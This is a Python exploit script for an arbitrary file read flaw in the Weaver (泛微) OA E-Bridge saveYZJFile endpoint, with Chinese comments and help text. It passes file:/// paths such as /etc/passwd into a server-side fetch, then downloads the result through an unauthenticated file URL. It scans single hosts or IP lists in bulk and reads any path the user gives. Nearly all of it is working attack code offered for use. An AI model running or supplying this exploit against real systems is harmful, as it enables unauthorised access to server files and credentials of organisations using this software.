# 泛微OA E-Bridge saveYZJFile 任意文件读取漏洞

import re
import json
import requests
import argparse
import traceback

def verify(url):
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    url_win = "{}{}".format(url.rstrip("/"), "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt")
    url_linux = "{}{}".format(url.rstrip("/"), "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt")

    #print("testing {}".format(url1))
    #urllib3.disable_warnings()
    requests.packages.urllib3.disable_warnings()
    r_w = requests.get(url_win, verify=False, headers=headers, timeout=8)
    r_l = requests.get(url_linux, verify=False, headers=headers, timeout=8)

    # print(r.content.decode())
    match = re.findall('id', r_w.content.decode())
    if match:
        print("[+] E-Bridge saveYZJFile任意文件读取漏洞 OS: windows {}".format(url_win))
        return 1

    match = re.findall('id', r_l.content.decode())
    if match:
        print("[+] E-Bridge saveYZJFile任意文件读取漏洞 OS: linux {}".format(url_linux))
        return 1
    return 0

# 任意文件读取 - 读取指定目录或文件内容
def read_anything(url, target):

    # 生成url
    url_target = "{}{}{}{}".format(url.rstrip("/"), "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///", target, "&fileExt=txt")
    print(url_target)

    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    r = requests.get(url_target, verify=False, headers=headers, timeout=8)
    # 获取返回值
    res = r.content.decode()    
    #print(res)
    
    # 获取id值
    j = json.loads (res) 
    id = j['id']
    print("id: {}".format(id))

    # 获取要访问的内容
    url2 = "{}{}{}".format(url.rstrip("/"), "/file/fileNoLogin/", id)
    print(url2)
    r2 = requests.get(url2, verify=False, headers=headers, timeout=8)
    res2 = r2.content.decode('gb18030')
    print("------------results------------")
    print(res2)
    
if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest='ip', type=str, help="单个ip地址")
    parser.add_argument("-l", "--list", dest='list', type=str, help="ip列表 - 批量扫描")
    parser.add_argument("-t", "--target", dest='target', type=str, help="访问的目录或文件 - 完整路径")
    
    args = parser.parse_args()
    ip = args.ip
    list = args.list
    target = args.target

    print(args)

    if ip:
        url = ip.replace('\n', '')
        if "http" not in url: 
            url = "http://" + url
        print(url)
        try:
            result = verify(url)
            if result:
                print("[+] {} maybe vulnerable".format(url))
            else:
                print("[-] {} not vulnerable".format(url))
        except Exception as e:
            print("wrong")
 
    if list:
        with open(list,"r") as f:
            for url in f.readlines():
                url = url.replace('\n', '')
                if "http" not in url: 
                    url = "http://" + url
                # print(url)
                try:
                    result = verify(url)
                    if result:
                        print("[+] {} maybe vulnerable".format(url))
                    else:
                        print("[-] {} not vulnerable".format(url))
                except Exception as e:
                    continue
                #print("[-] Error on: \n")
                #traceback.print_exc()

    if target:
        print("访问的目录或文件: ", target)
        read_anything(url, target)